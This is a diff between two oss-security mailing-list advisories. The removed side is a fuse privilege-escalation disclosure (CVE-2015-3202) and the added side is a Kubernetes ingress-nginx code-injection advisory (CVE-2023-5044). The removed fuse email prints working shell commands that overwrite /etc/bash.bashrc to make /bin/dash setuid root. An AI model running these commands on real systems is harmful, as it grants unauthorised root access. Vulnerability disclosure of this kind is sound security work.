@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1696" "Thursday" "21" "May" "2015" "09:55:16" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkJiPqAgng68xYMNfUXUfoxsu9uUe0Civgr7sXG_n_0O_Q@mail.gmail.com>" "40" "[oss-security] CVE-2015-3202 fuse privilege escalation" nil nil nil "5" "2015052116:55:16" "[oss-security] CVE-2015-3202 fuse privilege escalation" (number mark "        taviso@googl May 21   40/1696  " thread-indent "\"[oss-security] CVE-2015-3202 fuse privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 27657 invoked by uid 550); 21 May 2015 16:55:56 -0000
+Received: (qmail 19953 invoked by uid 550); 25 Oct 2023 16:42:30 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,77 +6,109 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 26577 invoked from network); 21 May 2015 16:55:49 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20120113;
-        h=mime-version:from:date:message-id:subject:to:content-type;
-        bh=gOseiyGaxeQtxJAkbcOsnfparRy4Na9q+YivrLmxa30=;
-        b=lvqRKjEBgsFTQNPCYmEDU4awlEnMZEMHNcGyJNe88Mgo96M6G0B5Gag140SqbasruD
-         wMr+0AW+kVIzSe6+ad0sMraMZxYo6qrbohfobu/cSkMQCyTl1+r5vt7lvhBIPxYrpmoK
-         por1Ueg/ybgX0atE+xx+Xnpy8HONPLDdg44bFwFwrdHYw9L8ZoPvCNFWJUOYMnNezid8
-         M/r5OuJVUntaueYDobnLIrmZmWPeDuOgfFkNUOkwu6GbWtnHF50Hw6tlOmA7i7uK2/oN
-         iC8OJqfnGNkzPoC140zI8sRuRatRTHLMPRNBBS/oCwzUP/auk1Ij6JhCilWPaRZoTNAP
-         YIUQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
-         :content-type;
-        bh=gOseiyGaxeQtxJAkbcOsnfparRy4Na9q+YivrLmxa30=;
-        b=hi5upuSQnp7CQaUF1sC/wWqXTSCnIbZWRn40kLaJmyVXmHVp+TziSkBBKYAgbf3U6p
-         HSsnE3WOLeT0czf34UJeHwsVrXe37yeUGzMjmpUwEZpf+X4+GM0Izs5TumRhOBeaaT8E
-         Gs7XlN3pm5Dqc8unl06Br6wItX20leVKOoVM9A6MPhh45D0kJAonHAaEHwMEJMRfnHqc
-         WUAXAu9CT54dYwOxpm3UHMolG9viLtYcuZjNlkEsOl8f73DMQHLQNjgdPs8aE88pW2rQ
-         9GLNyjZKZz0hR+6GTbuvhMJFlwVQf+XPYtes+UDuvznLnRtDxn/NBgsDI81D1cMGqGko
-         sJ+g==
-X-Gm-Message-State: ALoCoQlJtoiFRX3mUAQ1jr0Q5lw0FbVRGV1y63MFWtq+HFqCOKFbb0sCP8wNaUZCK+GF5NAEBl9q
-X-Received: by 10.55.33.40 with SMTP id h40mr8408883qkh.69.1432227337431; Thu,
- 21 May 2015 09:55:37 -0700 (PDT)
-MIME-Version: 1.0
-Message-ID: <CAJ_zFkJiPqAgng68xYMNfUXUfoxsu9uUe0Civgr7sXG_n_0O_Q@mail.gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Date: Thu, 21 May 2015 09:55:16 -0700
-From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE-2015-3202 fuse privilege escalation
+Received: (qmail 11597 invoked from network); 25 Oct 2023 16:32:41 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20230601; t=1698251549; x=1698856349; darn=lists.openwall.com;
+        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=KtB6vZ3ndA7FzUFxDvlCYQAKLsl7xAwThtilCDi638c=;
+        b=Az3EyVlTqhZaDxYdEPMvg+1Gu6H4D87TmX8Bj9c5wiHqspRYDh5GarKAcNbzhprlJO
+         FCwO2kPLkn5e/GO73fMfAt3VXjTKLs16DDKqRM0HtGy4bCb98VVwgqhd3BLjgRED1IFc
+         tXKpM7AIILs4zdFph01HS8+xAW7f47wvRlCl7QH/N3PDlCrqqEd737KjVxB03dA0Crso
+         TUktDxb1uclTH9eHZ89lVz2kbnJWTGfKglV8oo/Ege7P9SL0dcZERbzrjGy6JV+ErMsG
+         onn0sV3tZzkUleyMXXowElWevMeX2rSlSh00LIQmYc+llBD8RcZYNvmdkbFHML5BbfB4
+         0PuQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1698251549; x=1698856349;
+        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=KtB6vZ3ndA7FzUFxDvlCYQAKLsl7xAwThtilCDi638c=;
+        b=EOAA+JolwSpgC9sbhYs0lt+EMRyI+Z/CIxw+yIBPljTsc7SGfdy1EKUGvH42e7i7cV
+         8F5s34lGQSyx5igSbFu8wiNViEozb/LoFjgH4XYZ4Sh921mV0LjsLT8M7SBIYY5mO28m
+         4BRjL3B4wbzOXblFfnQ/EbTixSEw1yhCROZDcQVg7HCl2Y8yzSXHwHl51ly1Uez1vb3i
+         P6tmLsOzbK1Ks2SMfeJnJX/eqBTH7cbFFmK0EhLmdW7MUMKVBnX2MI9lR819dBhWtSOp
+         twgq1zF12Ytt+Q7TBiYCp5bJ86+cklk8F3T4jphMFDOhpjm+nDR8uyj3DwDKE0kCwLK0
+         NvAQ==
+X-Gm-Message-State: AOJu0YyFk4RBCzm7SXqhNfYkTp2yT4rEi5CtRny6WnqyVwXc9Ffgl4X/
+	PlMEXISmxRNTserNONlnmyTKCSgD6Gm3SoCJungeAloJoo/efT3LFw0=
+X-Google-Smtp-Source: AGHT+IGyC4aZtLV7sEnA9ZxR5C3NijawVLZ1g52V0ALndSSDbMxmSgNn1Sf7oT2LbEx/1oN4Ow0aatUZ6eYZ5RUl7rY=
+X-Received: by 2002:a05:600c:4592:b0:3f6:f4b:d4a6 with SMTP id
+ r18-20020a05600c459200b003f60f4bd4a6mr98543wmo.7.1698251548694; Wed, 25 Oct
+ 2023 09:32:28 -0700 (PDT)
+MIME-Version: 1.0
+References: <CABdrxGBOt0M6wD+gq6h0CPR__tL1pxzg-EivJtLGK82DzzEBQA@mail.gmail.com>
+In-Reply-To: <CABdrxGBOt0M6wD+gq6h0CPR__tL1pxzg-EivJtLGK82DzzEBQA@mail.gmail.com>
+From: CJ Cullen <cjcullen@google.com>
+Date: Wed, 25 Oct 2023 09:32:13 -0700
+Message-ID: <CABdrxGDrYdK-nhcA_Jt9=2MYvyxwS46-14MwMsaa-+tiQTQnfw@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="0000000000004d3ba406088d009b"
+Subject: [oss-security] [kubernetes] CVE-2023-5044: Code injection via nginx.ingress.kubernetes.io/permanent-redirect
+ annotation
 
-Hello, this was discussed on the distros list last week.
+--0000000000004d3ba406088d009b
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-The fusermount binary calls setuid(geteuid()) to reset the ruid when
-it invokes /bin/mount so that it can use privileged mount options that
-are normally restricted if ruid != euid. That's acceptable (but scary)
-in theory, because fusermount can sanitize the call to make sure it's
-safe.
+Issue Details
 
-http://sources.debian.net/src/fuse/2.9.3-15/util/mount_util.c/?hl=99#L99
+A security issue was identified in ingress-nginx
+<https://github.com/kubernetes/ingress-nginx> where the
+nginx.ingress.kubernetes.io/permanent-redirect annotation on an Ingress
+object (in the `networking.k8s.io` or `extensions` API group) can be used
+to inject arbitrary commands, and obtain the credentials of the
+ingress-nginx controller. In the default configuration, that credential has
+access to all secrets in the cluster.
 
-However, because mount thinks it's being invoked by root, it allows
-access to debugging features via the environment that would not
-normally be safe for unprivileged users and fusermount doesn't
-sanitize them.
+This issue has been rated High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L
+<https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U=
+/C:H/I:L/A:L>),
+and assigned CVE-2023-5044.
+Affected Components and Configurations
 
-Therefore, the bug is that the environment is not cleared when calling
-mount with ruid=0. One debugging feature available is changing the
-location of /etc/mtab by setting LIBMOUNT_MTAB, which can be abused to
-overwrite arbitrary files.
+This bug affects ingress-nginx. If you do not have ingress-nginx installed
+on your cluster, you are not affected. You can check this by running
+`kubectl get po -n ingress-nginx`.
 
-This can be exploited like so.
+If you are running the =E2=80=9Cchrooted=E2=80=9D ingress-nginx controller =
+introduced in
+v1.2.0 (gcr.io/k8s-staging-ingress-nginx/controller-chroot), command
+execution is possible but credential extraction is not, so the High
+severity does not apply.
 
-$ printf "chmod 4755 /bin/dash" > /tmp/exploit && chmod 755 /tmp/exploit
-$ mkdir -p '/tmp/exploit||/tmp/exploit'
-$ LIBMOUNT_MTAB=/etc/bash.bashrc  _FUSE_COMMFD=0 fusermount
-'/tmp/exploit||/tmp/exploit'
-fusermount: failed to open /etc/fuse.conf: Permission denied
-sending file descriptor: Socket operation on non-socket
-$ cat /etc/bash.bashrc
-/dev/fuse /tmp/exploit||/tmp/exploit fuse rw,nosuid,nodev,user=taviso 0 0
+Multi-tenant environments where non-admin users have permissions to create
+Ingress objects are most affected by this issue.
+Affected Versions
 
-Then simply wait for root to login, or alternatively overwrite
-/etc/default/locale and wait for cron to run a script that sources it.
-That means root wouldn't have to log in, but you would have to wait
-around until midnight to check if it worked.
+   -
 
-Tavis.
+   <v1.9.0
 
-P.S. Just for fun, I also came up with a version that fits in a tweet
-https://twitter.com/taviso/status/601370527437967360
+Versions allowing mitigation
+
+   -
+
+   v1.9.0
+
+Mitigation
+
+Ingress Administrators should set the --enable-annotation-validation flag
+to enforce restrictions on the contents of ingress-nginx annotation fields.
+Detection
+
+If you find evidence that this vulnerability has been exploited, please
+contact security@kubernetes.io
+Additional Details
+
+See ingress-nginx Issue #10572
+<https://github.com/kubernetes/ingress-nginx/issues/10572> for more details.
+Acknowledgements
+
+This vulnerability was reported by Jan-Otto Kr=C3=B6pke (Cloudeteer GmbH)
+
+Thank You,
+
+CJ Cullen on behalf of the Kubernetes Security Response Committee
+
+--0000000000004d3ba406088d009b--
